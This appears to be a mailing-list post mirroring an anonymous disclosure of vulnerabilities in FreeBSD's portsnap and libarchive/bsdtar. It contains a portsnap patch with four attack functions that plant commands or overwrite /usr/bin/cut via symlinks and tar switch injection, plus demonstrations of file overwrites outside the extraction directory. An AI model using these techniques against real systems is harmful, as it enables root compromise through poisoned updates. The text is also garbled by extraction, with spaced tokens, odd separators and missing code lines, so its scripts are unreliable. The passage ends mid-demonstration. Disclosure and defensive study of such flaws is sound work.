{
    "text": "Subject : FreeBSD update components vulns ( libarchive , bsdiff , portsnap )  ， Hi ,  ， I think this hasn't received the attention yet that it deserves. ， Recently a bug report showed up in libarchive's bug tracker [ 1 ] pointing ， to an anonymous document [ 2 ] on github that describes in a lot of detail ， several vulnerabilities in the update process of FreeBSD. Origin ， totally unclear. ， What's most worrying about it is that there's a hint that there may ， exist similar documents for Linux systems , yet they haven't showed up ， yet. ， Bottom line : FreeBSD needs to fix their stuff ( it seems the fix ， they used for bspatch is incomplete [ 3 ]  ) and Linux distros probably ， would do good trying to look into potential security issues in the ， update / package management components of their systems. ， Even though it's a lot I'll paste the content of the original post and ， the anonymous document so we have another mirror. ，  [ 1 ] https : /github.com/libarchive/libarchive/issues/743 ，  [ 2 ] https : /gist.github.com/anonymous/e48209b03f1dd9625a992717e7b89c4f ，  [ 3 ]  ， https : /lists.freebsd.org/pipermail/freebsd-security/2016-July/009016.html ， Bug report :  ， caught this post elsewhere. ， Our AV researchers have analyzed the following link that was ， cloud-submitted as suspect :  ， https : /gist.github.com/anonymous/e48209b03f1dd9625a992717e7b89c4f ， The document is from an unknown author and describes \"non-cryptanalytic ， attacks against FreeBSD update components.\" The affected components are ， the portsnap and freebsd-update tools , both directly and indirectly. ， From what we can tell , the text file is part of a larger stash of ， documents , all with the same attack-defense style. We have other ， documents , dated 2014 and 2015 , detailing attacks against the update ， systems of multiple Linux distributions and the corresponding defenses ， against \"the adversary.\" ， We believe this to be the work of an MITM-capable advanced threat actor. ， Full details of our findings will be released in the coming weeks. This ， is a courtesy heads-up to FreeBSD users. ， anonymous github document :  ，  | NON-CRYPTANALYTIC ATTACKS AGAINST FREEBSD UPDATE COMPONENTS |  ， 1. portsnap ， 2. libarchive/bsdtar ， 3. bspatch ，  | PORTSNAP |  ， The portsnap ( 8 ) script depends on a cryptographic chain of trust based ， on SHA256 hashes , all of them anchored to an RSA public key ( pub.ssl )  ， with a trusted keyprint defined in /etc/portsnap.conf. Unfortunately ,  ， the initial snapshot tarball is not properly verified , allowing a ， resourceful attacker to escape the cryptographic chain of trust and ， compromise the system. ， In the portsnap ( 8 ) script , the function fetch_snapshot (  ) fetches the ， initial snapshot tarball and immediately extracts it without any hash ， verification. ( Indeed , there is no hash with which to verify this ， tarball , for the hash in the tarball's filename is the hash of the ， tINDEX.new metadata file fetched earlier. )  ， Exploitation vectors follow from ，  ( i ) vulnerabilities in libarchive/bsdtar itself. These are the ， subject of the second security report. The symlink attacks have an ， obvious impact , allowing any file on the system to be overwritten ,  ， paving the way for immediate command execution. The hard-link ， attacks , typically being restricted to /var because of filesystem ， segmentation , can target /var/run/ld-elf.so.hints. ，  ( ii ) the attacker's ability to smuggle in unexpected tarball ， contents. At first glance , it appears that fetch_snapshot (  )  ， verifies , with two calls to the function fetch_snapshot_verify (  )  ,  ， the contents of the tarball that _should_ be there ; however ,  ， nothing is done about the contents of the tarball that _should not_ ， be there. ， This first report considers only the second class of vectors. ， Exploitation vector # 1 : fetch_snapshot_verify (  ) error ， The function fetch_snapshot_verify (  ) contains the following hash check :  ， The problem is that $ {F} expands to a file hash without any .gz suffix. ， As documented in the gunzip ( 1 ) manual page , gunzip ( 1 ) will first try ， opening the file snap/ $ {F}. Failing that , it will automatically append ， a suffix and try opening the file snap/ $ {F}.gz. ， An attacker can supply both snap/ $ {F} and snap/{F}.gz , where the first ， file is clean and passes the hash check and the second file is ， malicious. Because the portsnap ( 8 ) script explicitly appends a .gz ， suffix for every other use of gunzip ( 1 )  , the attacker's malicious file ， will be the one chosen for extraction. ， Exploitation vector # 1 : defense ， A band-aid solution for this vector is to add the .gz extension :  ， Exploitation vector # 2 : file prediction ， An attacker can smuggle in files that will be used in later portsnap ( 8 )  ， runs. When fetching new files based on differences in tINDEX/tINDEX.new ， and INDEX/INDEX.new , the functions fetch_make_patchlist (  ) and ， fetch_update (  ) will request new files only if they do not already exist ， in /var/db/portsnap/files. If they do already exist ( because an ， attacker has provided them )  , they will not be overwritten and will not ， be subject to hash verification. ， This is all well and good , but it would seem that an attacker faces the ， difficult task of guessing future SHA256 hashes. Fortunately for the ， attacker , there is usually an asynchrony on the portsnap servers ， between the snapshop tag ( snapshot.ssl ) and the update tag ，  ( latest.ssl ) . An initialization run of portsnap ( 8 ) will , via the ， automatically check for an available update. All the attacker has to do ， is ensure the tarball contains the malicious file snap/X.gz , where X is ， a hash learned from the already available update on the server. ， Exploitation vector # 2 : defense ， All four demonstration attacks given below would be foiled if the ， snapshot tarball were to be cryptographically verified , perhaps via a ， hash added to the snapshot tag. This would also provide protection for ， libarchive/bsdtar , the attack surface of which has barely been ， scratched in the second security report , with only filesystem-based ， attacks investigated. At ~ 100K lines of code with auto-detected ， multi-format support , libarchive/bsdtar is far too dangerous to trust ， with pre-verification root privileges. ， The more general problem is that portsnap ( 8 )  , along with ， freebsd-update ( 8 )  , contains more pre-verification processing than ， strictly necessary. Hashes are checked _after_ running gunzip ( 1 )  ,  ， bspatch ( 1 )  , and various character-stream utilities rather than ， _before_ , leading to problems such as the bspatch ( 1 ) memory-corruption ， attack in the third security report. Contrast this with the ports ， system proper , which guards virtually all processing with the ， 'checksum' target. ， Attack demonstrations ， Attack # 1 is an example attack using exploitation vector # 1. It ， achieves arbitrary command execution when the ports system is next used ， after an initialization run of `portsnap fetch extract`. ， Attack # 2 is an example attack using exploitation vector # 2. It achieves ， arbitrary command execution when the ports system is next used after an ， initialization run of `portsnap fetch extract`. ， Attacks # 3 and # 4 are example attacks using exploitation vector # 2. ， They achieve immediate arbitrary command execution during an ， initialization run of `portsnap fetch extract`. ， These attacks are purely for demonstration purposes , so no effort has ， been made to make them stealthy. Attacks # 3 and # 4 in particular are ， very noisy and do not bother extracting a full ports tree. ， The following patch can be applied to /usr/sbin/portsnap. The modified ， script allows convenient simulation of actual attacks. Simulation means ， that the modified script does not \"cheat\" - a corrupt snapshot could ， achieve the same effects outside the cryptographic chain of trust. Full ， descriptions of the individual attacks appear afterward. ，  @ -654 , 6 +654 , 95 @  ， } ， +attack_one (  ) { ， + ， + evilcmds='EVILCMDS ! = /usr/bin/touch /tmp/evil_file_1 ; echo x' ， + ， + snapshot=`cut -f3 -d' | ' tag.new`.tgz ， + index=`look INDEX tINDEX.new | cut -f2 -d' | '` ， + tar -xz -numeric-owner -f \" $ snapshot\" snap/ ， + mk=`zgrep '^Mk/bsd\\.commands\\.mk' \"snap/ $ index.gz\" | cut -f2 -d ， ' | '` ， + tar -xzf \"snap/ $ mk.gz\" ， + echo \" $ evilcmds\" > Mk/bsd.commands.mk ， + mv \"snap/ $ mk.gz\" \"snap/ $ mk\" ， + tar -czf \"snap/ $ mk.gz\" Mk/bsd.commands.mk ， + rm -f \" $ snapshot\" ， + tar -czf \" $ snapshot\" snap/ ， + rm -rf snap Mk ， +} ， + ， +attack_two (  ) { ， + ， + evilcmds='EVILCMDS ! = /usr/bin/touch /tmp/evil_file_2 ; echo x' ， + ， + indexold=`look INDEX tINDEX | cut -f2 -d' | '` ， + indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， + mk=`zgrep '^Mk/bsd\\.commands\\.mk' \"files/ $ indexold.gz\" | cut -f2 ， -d ' | '` ， + tar -xzf \"files/ $ mk.gz\" ， + echo \" $ evilcmds\" > Mk/bsd.commands.mk ， + tar -czf x.gz Mk/bsd.commands.mk ， + bcmhash=`gunzip -c x.gz | sha256` ， + mv x.gz \"files/ $ bcmhash.gz\" ， + ( zcat \"files/ $ indexold.gz\" ; echo \"Mk/bsd.commands.mk |  $ bcmhash\" )  |  ， + gzip > \"files/ $ indexnew.gz\" ， + rm -rf Mk ， +} ， + ， +attack_three (  ) { ， + ， + evilcmds='/usr/bin/touch /tmp/evil_file_3' ， + ， + cp /usr/bin/cut /tmp/cut.saved3 ， + echo \"/usr/bin/cut saved to /tmp/cut.saved3\" ， + indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， + cmdsfile=/var/db/portsnap/files/evilcmds.sh ， + cmdshash=`jot -s \" -b \"a\" 64` ， + symfile=.portsnap.INDEX ， + symhash=`jot -s \" -b \"f\" 64` ， + cat > \"files/ $ indexnew\" < EOF ， + $ cmdsfile |  $ cmdshash ， + $ symfile |  $ symhash ， +EOF ， + gzip \"files/ $ indexnew\" ， + cat > \" $ cmdsfile\" < EOF ， + #  ! /bin/sh ， + $ evilcmds ， +EOF ， + chmod 777 \" $ cmdsfile\" ， + touch \"files/ $ cmdshash\" ， + gzip \"files/ $ cmdshash\" ， + ln -s /usr/bin/cut \" $ symfile\" ， + tar -czf \"files/ $ symhash.gz\" \" $ symfile\" ， + rm -f \" $ symfile\" ， +} ， + ， +attack_four (  ) { ， + evilcmds='/usr/bin/touch /tmp/evil_file_4' ， + ， + cp /usr/bin/cut /tmp/cut.saved4 ， + echo \"/usr/bin/cut saved to /tmp/cut.saved4\" ， + indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， + symfile=sym ， + symhash=`jot -s \" -b \"a\" 64` ， + cmdshash=`jot -s \" -b \"f\" 64` ， + cat > \"files/ $ indexnew\" < EOF ， + $ symfile |  $ symhash ， +-P |  $ cmdshash ， +EOF ， + gzip \"files/ $ indexnew\" ， + ln -s /usr/bin \" $ symfile\" ， + tar -czf \"files/ $ symhash.gz\" \" $ symfile\" ， + rm -f \" $ symfile\" ， + mkdir \" $ symfile\" ， + cat > \" $ symfile/cut\" < EOF ， + #  ! /bin/sh ， + $ evilcmds ， +EOF ， + chmod 777 \" $ symfile/cut\" ， + tar -czf \"files/ $ cmdshash.gz\" \" $ symfile/cut\" ， + rm -r \" $ symfile\" ， +} ， + ，  # Fetch a snapshot tarball , extract , and verify. ， fetch_snapshot (  ) { ，  @ -671 , 6 +760 , 8 @  ， echo \"Fetching snapshot generated at `date -r ，  $ {SNAPSHOTDATE}` : \" fetch -r http : / $ {SERVERNAME}/s/ $ {SNAPSHOTHASH}.tgz ，  | return 1 ， + [ \" $ ATTACK\" = \"one\" ] & attack_one ， + ， echo -n \"Extracting snapshot. \" ， tar -xz -numeric-owner -f $ {SNAPSHOTHASH}.tgz snap/ | return ， 1 rm $ {SNAPSHOTHASH}.tgz ，  @ -714 , 6 +805 , 10 @  ， fetch_metadata | return 1 ， fetch_metadata_sanity | return 1 ， + [ \" $ ATTACK\" = \"two\" ] & attack_two ， + [ \" $ ATTACK\" = \"three\" ] & attack_three ， + [ \" $ ATTACK\" = \"four\" ] & attack_four ， + ， echo -n \"Updating from `date -r $ {OLDSNAPSHOTDATE}` \" ， echo \"to `date -r $ {SNAPSHOTDATE}`.\" ， Attack # 1 ， Directories /usr/ports and /var/db/portsnap are cleaned. ， attack_one (  ) { ， evilcmds='EVILCMDS ! = /usr/bin/touch /tmp/evil_file_1 ; echo x' ， snapshot=`cut -f3 -d' | ' tag.new`.tgz ， index=`look INDEX tINDEX.new | cut -f2 -d' | '` ， tar -xz -numeric-owner -f \" $ snapshot\" snap/ ， mk=`zgrep '^Mk/bsd\\.commands\\.mk' \"snap/ $ index.gz\" | cut -f2 -d ' | '` ， tar -xzf \"snap/ $ mk.gz\" ， echo \" $ evilcmds\" > Mk/bsd.commands.mk ， mv \"snap/ $ mk.gz\" \"snap/ $ mk\" ， tar -czf \"snap/ $ mk.gz\" Mk/bsd.commands.mk ， rm -f \" $ snapshot\" ， tar -czf \" $ snapshot\" snap/ ， rm -rf snap Mk ， } ， This attack simulates the delivery of a corrupt snapshot tarball ， including two files :  ， snap/ $ mk ， snap/ $ mk.gz ， where snap/ $ mk contains a clean Mk/bsd.commands.mk and is used to pass ， hash verification but where snap/ $ mk.gz contains a custom ， Mk/bsd.commands.mk and is used for extraction. ， Mk/bsd.commands.mk is a file that is not updated often , so ， modifications will not be overwritten , and it is unconditionally ， included in Mk/bsd.port.mk , so commands inside it will be run when ， using the ports system. ，  # ATTACK=one portsnap fetch ，  [ . ]  ，  # portsnap extract ，  [ . ]  ，  # tail -n 1 /usr/ports/Mk/bsd.commands.mk ， EVILCMDS ! = /usr/bin/touch /tmp/evil_file_1 ; echo x ，  # cd /usr/ports/ [ . ] / [ . ]  ，  # ls /tmp/evil_file_1 ， ls : /tmp/evil_file_1 : No such file or directory ，  # make fetch ，  [ . ]  ，  # ls /tmp/evil_file_1 ， /tmp/evil_file_1 ， Attack # 2 ， Directories /usr/ports and /var/db/portsnap are cleaned. ， attack_two (  ) { ， evilcmds='EVILCMDS ! = /usr/bin/touch /tmp/evil_file_2 ; echo x' ， indexold=`look INDEX tINDEX | cut -f2 -d' | '` ， indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， mk=`zgrep '^Mk/bsd\\.commands\\.mk' \"files/ $ indexold.gz\" | cut -f2 -d ， ' | '` tar -xzf \"files/ $ mk.gz\" ， echo \" $ evilcmds\" > Mk/bsd.commands.mk ， tar -czf x.gz Mk/bsd.commands.mk ， bcmhash=`gunzip -c x.gz | sha256` ， mv x.gz \"files/ $ bcmhash.gz\" ，  ( zcat \"files/ $ indexold.gz\" ; echo \"Mk/bsd.commands.mk |  $ bcmhash\" )  |  ， gzip > \"files/ $ indexnew.gz\" ， rm -rf Mk ， } ， This attack simulates the delivery of a corrupt snapshot tarball ， including two malicious files :  ， snap/ $ bcmhash.gz ， snap/ $ indexnew.gz ， where snap/ $ bcmhash.gz contains a custom Mk/bsd.commands.mk and where ， snap/ $ indexnew.gz contains an update INDEX. ( Note that the script peeks ， inside tINDEX.new for the update INDEX hash , which is not \"cheating , \" ， available on the server , assuming an update is available , which is ， typically the case. )  ， The update INDEX is an otherwise sane INDEX file with the following ， line appended :  ， Mk/bsd.commands.mk |  $ bcmhash ， When portsnap ( 8 ) discovers that the update INDEX already exists on the ， filesystem , this file will not be overwritten and will not be ， hash-verified. ，  # ATTACK=two portsnap fetch ，  [ . ]  ，  # portsnap extract ，  [ . ]  ，  # tail -n 1 /usr/ports/Mk/bsd.commands.mk ， EVILCMDS ! = /usr/bin/touch /tmp/evil_file_2 ; echo x ，  # cd /usr/ports/ [ . ] / [ . ]  ，  # ls /tmp/evil_file_2 ， ls : /tmp/evil_file_2 : No such file or directory ，  # make fetch ，  [ . ]  ，  # ls /tmp/evil_file_2 ， /tmp/evil_file_2 ， Attack # 3 ， Directories /usr/ports and /var/db/portsnap are cleaned. ， attack_three (  ) { ， evilcmds='/usr/bin/touch /tmp/evil_file_3' ， cp /usr/bin/cut /tmp/cut.saved3 ， echo \"/usr/bin/cut saved to /tmp/cut.saved3\" ， indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， cmdsfile=/var/db/portsnap/files/evilcmds.sh ， cmdshash=`jot -s \" -b \"a\" 64` ， symfile=.portsnap.INDEX ， symhash=`jot -s \" -b \"f\" 64` ， cat > \"files/ $ indexnew\" < EOF ，  $ cmdsfile |  $ cmdshash ，  $ symfile |  $ symhash ， EOF ， gzip \"files/ $ indexnew\" ， cat > \" $ cmdsfile\" < EOF ，  #  ! /bin/sh ，  $ evilcmds ， EOF ， chmod 777 \" $ cmdsfile\" ， touch \"files/ $ cmdshash\" ， gzip \"files/ $ cmdshash\" ， ln -s /usr/bin/cut \" $ symfile\" ， tar -czf \"files/ $ symhash.gz\" \" $ symfile\" ， rm -f \" $ symfile\" ， } ， This attack simulates the delivery of a corrupt snapshot tarball ， including four malicious files :  ， snap/ $ indexnew.gz ， snap/evilcmds.sh ， snap/ $ cmdshash.gz ， snap/ $ symhash.gz ， where snap/ $ indexnew.gz contains an update INDEX , where ， snap/evilcmds.sh is a shell script containing arbitrary commands , where ， snap/ $ cmdshash.gz is a dummy file for snap/evilcmds.sh , and where ， snap/ $ symhash.gz contains the symlink .portsnap.INDEX -> /usr/bin/cut. ， The update INDEX is the following :  ， /var/db/portsnap/files/evilcmds.sh | aaa [ . ] aaa ， .portsnap.INDEX | fff [ . ] fff ， The idea is to use a symlink to break out of /usr/ports. Although ， tar ( 1 )  , when operating as intended without special switches , refuses to ， extract _through_ symlinks , it will happily _extract_ symlinks pointing ， anywhere on the system , allowing another utility to cause damage ， _through_ those symlinks. Observe the following lines in the ， portsnap ( 8 ) script :  ， extract_metadata (  ) { ， sort $ {WORKDIR}/INDEX > $ {PORTSDIR}/.portsnap.INDEX ， During extraction , .portsnap.INDEX will become a symlink pointing to ， /usr/bin/cut. The lines above will cause /usr/bin/cut to be overwritten ， with our sorted update INDEX. In other words , /usr/bin/cut will contain ， the following :  ， .portsnap.INDEX | fff [ . ] fff ， /var/db/portsnap/files/evilcmds.sh | aaa [ . ] aaa ， /usr/bin/cut will be executed in extract_indices (  ) . The kernel will ， reject the new /usr/bin/cut for execution , but the shell will ， notice the failed execution and try running /usr/bin/cut as a shell ， script. The pipe characters will be interpreted as command ， delimiters. Hence we have achieved execution ， of /var/db/portsnap/files/evilcmds.sh ( the three other \"commands\" ， will fail , of course ) . ， /tmp/cut.saved3 is a copy of the original /usr/bin/cut. ，  # ATTACK=three portsnap fetch ，  [ . ]  ，  # ls /tmp/evil_file_3 ， ls : /tmp/evil_file_3 : No such file or directory ，  # portsnap extract ，  [ . ]  ，  # ls /tmp/evil_file_3 ， /tmp/evil_file_3 ，  # cat /usr/bin/cut ， .portsnap.INDEX | fff [ . ] fff ， /var/db/portsnap/files/evilcmds.sh | aaa [ . ] aaa ，  # mv /tmp/cut.saved3 /usr/bin/cut ， Attack # 4 ， Directories /usr/ports and /var/db/portsnap are cleaned. ， attack_four (  ) { ， evilcmds='/usr/bin/touch /tmp/evil_file_4' ， cp /usr/bin/cut /tmp/cut.saved4 ， echo \"/usr/bin/cut saved to /tmp/cut.saved4\" ， indexnew=`look INDEX tINDEX.new | cut -f2 -d' | '` ， symfile=sym ， symhash=`jot -s \" -b \"a\" 64` ， cmdshash=`jot -s \" -b \"f\" 64` ， cat > \"files/ $ indexnew\" < EOF ，  $ symfile |  $ symhash ， -P |  $ cmdshash ， EOF ， gzip \"files/ $ indexnew\" ， ln -s /usr/bin \" $ symfile\" ， tar -czf \"files/ $ symhash.gz\" \" $ symfile\" ， rm -f \" $ symfile\" ， mkdir \" $ symfile\" ， cat > \" $ symfile/cut\" < EOF ，  #  ! /bin/sh ，  $ evilcmds ， EOF ， chmod 777 \" $ symfile/cut\" ， tar -czf \"files/ $ cmdshash.gz\" \" $ symfile/cut\" ， rm -r \" $ symfile\" ， } ， This attack simulates the delivery of a corrupt snapshot tarball ， including three malicious files :  ， snap/ $ indexnew.gz ， snap/ $ symhash.gz ， snap/ $ cmdshash.gz ， where snap/ $ indexnew.gz contains an update INDEX , where ， snap/ $ symhash.gz contains the symlink sym -> /usr/bin , and where ， snap/ $ cmdshash.gz contains the shell script sym/cut. ， The update INDEX is the following :  ， sym | aaa [ . ] aaa ， -P | fff [ . ] fff ， As in attack # 3 , the idea is to use a symlink to break out ， of /usr/ports and overwrite /usr/bin/cut , only this time we simplify ， the attack with a tar ( 1 ) -P switch injection to disable the usual ， symlink checks. Observe the following lines in the portsnap ( 8 ) script :  ， extract_run (  ) { ，  [ . ]  ， rm -f $ {PORTSDIR}/ $ {FILE} ， tar -xz -numeric-owner -f $ {WORKDIR}/files/ $ {HASH}.gz \\ ， -C $ {PORTSDIR} $ {FILE} ， After the symlink sym -> /usr/bin has been extracted , the shell script ， sym/cut will be extracted through that symlink ,  ， overwriting /usr/bin/cut. The tar ( 1 ) symlink checks are bypassed ， because $ {FILE} expands to the -P switch. ， /tmp/cut.saved4 is a copy of the original /usr/bin/cut. ，  # ATTACK=four portsnap fetch ，  [ . ]  ，  # ls /tmp/evil_file_4 ， ls : /tmp/evil_file_4 : No such file or directory ，  # portsnap extract ，  [ . ]  ，  # ls /tmp/evil_file_4 ， /tmp/evil_file_4 ，  # cat /usr/bin/cut ，  #  ! /bin/sh ， /usr/bin/touch /tmp/evil_file_4 ，  # mv /tmp/cut.saved4 /usr/bin/cut ，  | LIBARCHIVE/BSDTAR |  ， The non-HEAD branches of FreeBSD still use libarchive/bsdtar 3.1.2 in ， base , released in Feb 2013. The next version , 3.2.0 , was released ， recently ( May 2016 ) and added to both the HEAD branch and ports. ， Unless invoked with the -P switch , bsdtar tries to prevent three ， classes of filesystem attacks :  ，  ( 1 ) absolute paths ， - handled by bsdtar itself via edit_pathname (  ) in tar/util.c ， - not handled by bsdcpio until upstream commit 5935715 ( Mar ， 2015 )  , addressing CVE-2015-2304 ( nothing more will be said about ， bsdcpio in this report , but note that FreeBSD non-HEAD is ， still vulnerable to this particular bug )  ，  ( 2 ) dot-dot paths ， - handled by libarchive via cleanup_pathname (  ) in ， libarchive/archive_write_disk_posix.c ，  ( 3 ) extraction through symlinks ， - handled by libarchive via check_symlinks (  ) in ， libarchive/archive_write_disk_posix.c ， Three vulnerabilities exist in check_symlinks (  ) . One of these , allowing ， a file overwrite outside the extraction directory , was discovered ， independently and has already been silently fixed upstream , though ， FreeBSD non-HEAD is still vulnerable. The other two vulnerabilities - ， one allowing a file overwrite outside the extraction directory and the ， other allowing permission changes to a directory outside the extraction ， directory - are new and exist in both FreeBSD and upstream source. ， A fourth vulnerability , also new and existing in both FreeBSD and ， upstream source , arises from the fact that link-target pathnames are ， not subjected to the security checks listed above. This , combined with ， the fact that libarchive supports the POSIX feature of hard links with ， data payloads , allows a file overwrite outside the extraction directory ，  ( under hard-linking constraints ) . ， The vulnerability matrix summarizing the above information is as ， follows :  ，  | non-HEAD ( 3.1.2 )  | HEAD/ports ( 3.2.0 )  | latest upstream ， bsdcpio | Y | N | N ， vuln # 1 | Y | N | N ， vuln # 2 | Y | Y | Y ， vuln # 3 | Y | Y | Y ， vuln # 4 | Y | Y | Y ，  ( Y = vulnerable , N = not vulnerable )  ， Earlier versions may also be vulnerable. ， VULNERABILITY # 1 ， {Affects} ， 3.1.2 ( FreeBSD non-HEAD )  , possibly earlier ， {Description} ， check_symlinks (  ) checks only the first pathname component for symlinks. ， In the pathname ， dir1/dir2/file ， check_symlinks (  ) will ensure that 'dir1' is not a symlink , and in most ， cases , 'file' will fortuitously still be unlinked elsewhere in ， libarchive if it is a symlink , but 'dir2' will not be checked. ， {Demonstration} ， libarchive correctly catches this :  ，  $ echo hello > /tmp/myfile ，  $ ln -s /tmp dir1 ，  $ tar cf x.tar dir1 ，  $ rm dir1 ，  $ mkdir dir1 ，  $ echo goodbye > dir1/myfile ，  $ touch clear_safe_cache ，  $ tar rf x.tar clear_safe_cache dir1/myfile ，  $ rm -r clear_safe_cache dir1 ，  $ ls ， x.tar ，  $ tar tf x.tar ， dir1 ， clear_safe_cache ， dir1/myfile ，  $ tar xvf x.tar ， x dir1 ， x clear_safe_cache ， x dir1/myfile : Cannot extract through symlink dir1 ， tar : Error exit delayed from previous errors. ，  $ cat /tmp/myfile ， hello ， But libarchive fails to catch this :  ，  $ rm *  ，  $ mkdir dir1 ，  $ ln -s /tmp dir1/dir2 ，  $ tar cf x.tar dir1/dir2 ，  $ rm -r dir1 ，  $ mkdir -p dir1/dir2 ，  $ echo goodbye > dir1/dir2/myfile ，  $ touch clear_safe_cache ，  $ tar rf x.tar clear_safe_cache dir1/dir2/myfile ，  $ rm -r clear_safe_cache dir1 ，  $ ls ， x.tar ，  $ tar tf x.tar ， dir1/dir2 ， clear_safe_cache ， dir1/dir2/myfile ，  $ tar xvf x.tar ， x dir1/dir2 ， x clear_safe_cache ， x dir1/dir2/myfile ，  $ cat /tmp/myfile ， goodbye ， {Defense} ， This was independently discovered and silently fixed in upstream commit ， 6a7b8ad ( Jan 2016 ) . There was no associated version bump , CVE ID , or ， vuln report , so it is unclear whether the security impact was ， recognized. The fix is included in the recent 3.2.0 release , but it is ， not mentioned in the \"Security Fixes\" section of the release notes. ， VULNERABILITY # 2 ， {Affects} ， 3.2.0 ( FreeBSD HEAD/ports )  , 3.1.2 ( FreeBSD non-HEAD )  , possibly earlier ， {Description} ， When check_symlinks (  ) fails on an lstat (  ) call , it checks errno for only ， ENOENT :  ， r = lstat ( a->name , &st )  ;  ， / * We've hit a dir that doesn't exist ; stop now. * / ， } ， All other error conditions get a free pass. In particular , ENAMETOOLONG ， gets a free pass. This is by design : The function ， _archive_write_disk_header (  ) calls edit_deep_directories (  ) after ， check_symlinks (  ) in an effort to accommodate deep directories. ， Unfortunately , the interaction between the symlink checks and the ， deep-directory support introduces a security vulnerability , in that ， the symlink checks are effectively disabled for long pathnames. ， {Demonstration} ，  #  ! /bin/sh ， ELEMENT_LEN=200 ， ELEMENT_NUM=6 ， ELEMENT_STR=`jot -s \" -b \"D\" $ ELEMENT_LEN` ， currdir=`pwd` ， exec < \" $ 2\" ， i=0 ， mkdir $ ELEMENT_STR ， cd $ ELEMENT_STR ， i= $  (  $ i + 1 )  ， done ， ln -s / slink ， tar cf \" $ currdir/x.tar\" -C \" $ currdir\" $ ELEMENT_STR ， rm -f slink ， mkdir -p \"slink/`dirname \" $ 1\"`\" ， cat - > \"slink/ $ 1\" ， tar rf \" $ currdir/x.tar\" -C \" $ currdir\" $ ELEMENT_STR ， cd \" $ currdir\" ， rm -rf $ ELEMENT_STR ，  $ cat /tmp/myfile ， cat : /tmp/myfile : No such file or directory ，  $ echo this is the data I want > data ，  $ ./vuln2.sh /tmp/myfile data ，  $ ls ， data vuln2.sh x.tar ，  $ tar xf x.tar ，  [ error messages omitted ]  ，  $ cat /tmp/myfile ， this is the data I want ，  $ rm -r D * data x.tar ，  $ echo overwrite existing file > data ，  $ ./vuln2.sh /tmp/myfile data ，  $ tar xf x.tar ，  [ error messages omitted ]  ，  $ cat /tmp/myfile ， overwrite existing file ， {Defense} ， The best solution is probably to excise the function ， edit_deep_directories (  ) altogether and then change check_symlinks (  ) to ， It does not appear to be worth the trouble trying to work around ， PATH_MAX. Incidentally , POSIX defines PATH_MAX to include the ， terminating NUL , so if edit_deep_directories (  ) is to remain , its two ， strlen (  ) checks should be fixed accordingly : < PATH_MAX and >= PATH_MAX. ， VULNERABILITY # 3 ， {Affects} ， 3.2.0 ( FreeBSD HEAD/ports )  , 3.1.2 ( FreeBSD non-HEAD )  , possibly earlier ， {Description} ， check_symlinks (  ) employs a single-bin safety cache as an optimization. ， The idea is that after checking the pathname ， aaa/bbb/ccc ， aaa/bbb/ddd ， there is no need to recheck aaa/bbb for symlinks. Unfortunately , a ， cached aaa/bbb/ccc ( where the directories are included for ， illustration purposes - simple filenames also work ) allows symlink ， checks to be bypassed if the next entry's pathname is one of ， a ， aa ， aaa ， aaa/b ， aaa/bb ， aaa/bbb ， aaa/bbb/c ， aaa/bbb/cc ， aaa/bbb/ccc ， The functions restore_entry (  ) and create_filesystem_object (  ) in ， libarchive/archive_write_disk_posix.c appear to constrain the impact of ， this vulnerability on FreeBSD to permission changes on arbitrary ， directories. The root user is affected in default operation , whereas ， normal users may need to issue the -p switch ( distinct from the -P ， switch ) to be affected :  ，  $ mkdir /tmp/mydir ，  $ ls -ld /tmp/mydir ， drwxr-xr-x [ . ]  ，  $ ln -s /tmp/mydir sym ，  $ tar cf x.tar sym ，  $ rm sym ，  $ mkdir sym ，  $ chmod 777 sym ，  $ tar rf x.tar sym ，  $ rmdir sym ，  $ tar tf x.tar ， sym ， sym/ ，  $ tar xf x.tar ，  $ ls -ld /tmp/mydir ， drwxr-xr-x [ . ]  ，  $ ls ， sym x.tar ，  $ rm sym ，  $ tar xf x.tar -p ，  $ ls -ld /tmp/mydir ， drwxrwxrwx [ . ]  ，  $ rm -r /tmp/mydir *  ， As the root user :  ，  # mkdir /tmp/mydir ，  # ls -ld /tmp/mydir ， drwxr-xr-x [ . ]  ，  # ln -s /tmp/mydir sym ，  # tar cf x.tar sym ，  # rm sym ，  # mkdir sym ，  # chmod 777 sym ，  # tar rf x.tar sym ，  # rmdir sym ，  # tar tf x.tar ， sym ， sym/ ，  # tar xf x.tar ，  # ls -ld /tmp/mydir ， drwxrwxrwx [ . ]  ， {Defense} ， This vulnerability subverts the assurances of check_symlinks (  )  , so a ， fix should be local to check_symlinks (  ) . It might also be worth ， investigating whether the performance gains of the safety cache are ， worth the added complexity and hairiness in such a security-critical ， function. ， VULNERABILITY # 4 ， {Affects} ， 3.2.0 ( FreeBSD HEAD/ports )  , 3.1.2 ( FreeBSD non-HEAD )  , possibly earlier ， {Description} ， Recall the three classes of filesystem attacks listed earlier :  ，  ( 1 ) absolute paths ，  ( 2 ) dot-dot paths ，  ( 3 ) extraction through symlinks ， These checks are applied as usual to the pathnames of symlinks and hard ， links but not to their targets , with one exception : The targets of ， hard links are subjected to absolute-path checks in tar/util.c as ， of FreeBSD revision r270661 and upstream commit cf8e67f ( it seems ， the revision was submitted upstream and was rewritten in a ， different form as the commit - both strip leading slashes from the ， hard-link targets , though not for security reasons ) . ， Archive entries for hard links can use dot-dot pathnames in their ， targets to point at any file on the system , subject to the usual ， hard-linking constraints. Alternatively , on systems that follow ， symlinks for link (  ) - which is an implementation-defined behavior ， supported by FreeBSD - a symlink can first be extracted that uses ， absolute or dot-dot pathnames to point at the file , and then the ， hard-link target can be the symlink , which means that filtering the ， hard-link target for dot-dot paths is not sufficient to address the ， problem. ， The ability to point hard links at outside files becomes more serious ， when we consider that libarchive supports the POSIX feature of hard ， links with data payloads. This allows an attacker to point a hard link ， at an existing target file outside the extraction directory and use the ， data payload to overwrite the file. ， {Demonstration} ， Exploit code is included below. ，  $ cd /tmp/cage ，  $ ls ， vuln4.c ，  $ cc -o vuln4 vuln4.c -larchive ，  $ echo hello > /tmp/target ，  $ echo goodbye > data ，  $ ./vuln4 x.tar data p ./././tmp/target ，  $ tar tvf x.tar ， -rwxrwxrwx 0 0 0 8 Jan 1 1970 p link ， to ./././tmp/target $ tar xvf x.tar ， x p ，  $ cat /tmp/target ， goodbye ， The code could be rewritten to use symlinks instead of dot-dot paths :  ，  $ cd /tmp/cage ，  $ ls ， 